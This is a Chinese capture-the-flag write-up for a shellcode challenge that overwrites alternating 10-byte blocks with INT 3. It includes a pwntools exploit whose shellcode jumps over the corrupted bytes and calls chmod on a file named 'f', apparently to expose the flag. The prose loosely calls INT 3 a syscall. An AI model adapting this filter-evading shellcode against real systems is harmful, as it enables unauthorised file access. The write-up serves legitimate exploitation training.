# 挑战简介
此挑战通过用 0xcc 覆盖每隔 10 个字节来修改您的 shellcode。0xcc 在被解释为
指令时是 `INT 3`，这是调用调试器的中断。您必须避免在 shellcode 中进行这些修改。

# 思路

分析题目意思，结合level8的执行结果，可以得知：  
**每执行10个字节，接下来的10个字节会强制改变成int3(另一种syscall)**  
如果出现这种字节，也就意味着，后面的字节会变成无法执行(21-30)  
所以每次我们输入的有效字节只有8个，预留两个字节进行跳转，无效的字节位置则写入nop即可，用于填充  
我们选择参照level8的shellcode注入  

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-9')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

shellcode = asm('''
    push 0x66
    mov rdi, rsp
    push 4

_stage:
    pop rsi
    jmp short skip
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
skip:
    push 90
    pop rax
    syscall
    ret
    ret
    ret
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
